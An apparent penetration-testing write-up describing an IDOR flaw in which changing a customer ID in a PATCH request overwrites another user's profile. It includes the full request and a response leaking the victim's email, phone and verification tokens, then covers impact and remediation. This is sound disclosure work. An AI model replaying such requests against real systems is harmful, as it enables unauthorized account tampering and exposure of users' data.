---
title: "IDOR - Unauthorized User Profile Update via Customer ID Manipulation"
date: 2026-03-21
tags: ["idor", "Bug"]
author: "Fernandez"
summary: "Click to read the full walkthrough"
---

Severity: ```High ```
---
> ⚠️ **Note:** All sensitive information (e.g., domains, endpoints, IDs, and personal data) has been redacted or modified. The core vulnerability and methodology remain unchanged.

<h1>BACKGROUND</h1>

During a penetration testing assessment on a client's web application, I was going through the normal user workflow; registration, login, profile management, the usual stuff. Nothing seemed out of the ordinary at first glance. But as I always do, I had Burp Suite running in the background capturing everything.
While playing around with the profile update functionality, I noticed something interesting in the request. The endpoint was updating user information using a numeric ID directly in the URL path. That immediately caught my attention.

<h1>THE DISCOVERY</h1>
The application was sending a PATCH request to update user profile details:

`PATCH /market-v2/customer/customer/724`

The number 724 was the user ID. My first thought was what happens if I change that number?

<h1>EXPLOITATION</h1>

I sent the request to Burp Repeater and changed the ID to another user's ID. No additional authentication. No ownership check. Just changed the number and fired the request.
The server responded with HTTP 200 OK and returned the victim's full profile data, updated with whatever values I supplied in the request body.

## REQUEST
```http
PATCH /market-v2/customer/customer/891 HTTP/2
Host: api.redacted.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) 
            Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Access-Control-Allow-Origin: *
Content-Length: 118
Origin: https://www.redacted.com
Referer: https://www.redacted.com/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Priority: u=0
Te: trailers

{
  "bankName": null,
  "accountNumber": null,
  "accountName": null,
  "bankCode": null,
  "firstName": "James",
  "lastName": "Wilson"
}
```

## RESPONSE
```http
HTTP/2 200 OK
Date: Tue, 18 Mar 2025 14:22:11 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 518
Server: nginx/1.18.0 (Ubuntu)
X-Powered-By: Express
Access-Control-Allow-Origin: *

{
  "success": true,
  "response_code": "00",
  "response_description": "Success",
  "data": {
    "id": 891,
    "firstName": "James",
    "lastName": "Wilson",
    "phoneNumber": "+2348012345678",
    "email": "david.okafor@gmail.com",
    "emailVerifiedAt": null,
    "phoneVerifiedAt": null,
    "emailToken": "b7e23ec29af22b0b4e41da31e868d57",
    "smsToken": "140892",
    "accountStatus": true,
    "accountNumber": null,
    "accountName": null,
    "bankCode": null,
    "bankName": null,
    "createdAt": "2025-03-17T10:45:03.304Z",
    "updatedAt": "2025-03-18T14:22:11.000Z",
    "deletedAt": null
  }
}
```

<img width="1920" height="792" alt="Screenshot (131)" src="https://github.com/user-attachments/assets/09532408-dc5b-47bc-9afb-d5afe88719c5" />


## Impact

The impact here is significant. Any authenticated user could:

<li>Update any other user's first and last name</li>
<li>Potentially update bank account details once populated</li>
<li>Access victim's email address and phone number from the response</li>
<li>Cause account integrity issues at scale by mass updating user profiles</li>

## Root Cause
The application was performing no server side authorization check to verify that the authenticated user's session matched the ID in the URL. The backend simply accepted the request and processed it.

## Remediation
1. Always verify resource ownership server side
   before processing any update request

2. Derive the user ID from the authenticated
   session token — never from user supplied input

3. Implement authorization middleware that
   checks session ownership on every
   state changing request
